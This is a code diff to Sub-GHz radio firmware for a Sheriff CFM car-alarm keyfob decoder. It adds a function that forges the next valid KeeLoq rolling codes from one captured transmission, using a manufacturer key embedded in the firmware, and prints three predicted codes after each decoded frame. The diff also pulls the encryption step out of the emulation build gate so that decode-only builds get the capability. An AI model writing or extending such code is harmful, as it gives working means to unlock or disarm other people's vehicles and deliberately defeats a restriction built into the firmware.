@@ -90,7 +90,8 @@ static void cfm_decrypt_transform(uint8_t* hop, uint8_t model) {
     }
 }
 
-#ifdef ENABLE_EMULATE_FEATURE
+// Inverse of cfm_decrypt_transform. Kept outside ENABLE_EMULATE_FEATURE so the
+// next-code predictor (and decode-only builds) can rebuild a byte-correct frame.
 static void cfm_encrypt_transform(uint8_t* hop, uint8_t model) {
     if(model == CFM_MODEL_ZX750) {
         hop[0] = cfm_swap(hop[0]);
@@ -106,7 +107,6 @@ static void cfm_encrypt_transform(uint8_t* hop, uint8_t model) {
         hop[2] = t;
     }
 }
-#endif
 
 static uint64_t cfm_get_mfkey(uint8_t model) {
     uint8_t dkey[8];
@@ -118,6 +118,35 @@ static uint64_t cfm_get_mfkey(uint8_t model) {
     uint64_t key = 0;
     for(int i = 7; i >= 0; i--) key = (key << 8) | dkey[i];
     return key;
+}
+
+#define CFM_PREDICT_COUNT 3
+
+// Next-code predictor. Drives the SAME encode chain as cfm_build_upload
+// (hop_plain -> KeeLoq encrypt with the firmware-embedded mfkey -> per-model
+// cfm_encrypt_transform -> (fix<<32)|hop) but for an ABSOLUTE counter value, so
+// the returned 64-bit frame is byte-correct and decodes back to
+// (serial, btn, cnt_abs). Not gated: the counter is cleartext and the mfkey is
+// embedded, so prediction needs no secret and works in decode-only builds.
+static uint64_t cfm_predict_key(uint8_t model, uint32_t serial, uint8_t btn, uint16_t cnt_abs) {
+    uint16_t serial_lo = (uint16_t)(serial & 0x3FF);
+    uint32_t hop_plain =
+        ((uint32_t)btn << 24) | ((uint32_t)serial_lo << 16) | (uint32_t)cnt_abs;
+
+    uint64_t mfkey = cfm_get_mfkey(model);
+    uint32_t hop_encrypted = subghz_protocol_keeloq_common_encrypt(hop_plain, mfkey);
+
+    uint8_t hop_bytes[4] = {
+        (uint8_t)(hop_encrypted & 0xFF),
+        (uint8_t)((hop_encrypted >> 8) & 0xFF),
+        (uint8_t)((hop_encrypted >> 16) & 0xFF),
+        (uint8_t)((hop_encrypted >> 24) & 0xFF)};
+    cfm_encrypt_transform(hop_bytes, model);
+
+    uint32_t hop_transformed = (uint32_t)hop_bytes[0] | ((uint32_t)hop_bytes[1] << 8) |
+                               ((uint32_t)hop_bytes[2] << 16) | ((uint32_t)hop_bytes[3] << 24);
+
+    return ((uint64_t)serial << 32) | (uint64_t)hop_transformed;
 }
 
 // Returns true on success and fills out params.
@@ -347,6 +376,22 @@ void subghz_protocol_decoder_sheriff_cfm_get_string(void* context, FuriString* o
         (unsigned long)instance->generic.serial,
         (unsigned int)instance->generic.btn,
         (unsigned int)instance->generic.cnt);
+
+    // Predicted upcoming rolling codes. btn is only ever the decode whitelist
+    // (0x10/0x20/0x40/0x80) after a valid frame; 0 on a fresh instance -> skip.
+    if(instance->generic.btn != 0) {
+        for(uint8_t i = 1; i <= CFM_PREDICT_COUNT; i++) {
+            uint16_t next_cnt = (uint16_t)(instance->generic.cnt + i);
+            uint64_t next_key = cfm_predict_key(
+                instance->model, instance->generic.serial, instance->generic.btn, next_cnt);
+            furi_string_cat_printf(
+                output,
+                "\r\nNext+%u:%08lX%08lX",
+                (unsigned int)i,
+                (unsigned long)(next_key >> 32),
+                (unsigned long)(next_key & 0xFFFFFFFF));
+        }
+    }
 }
 
 #ifdef ENABLE_EMULATE_FEATURE
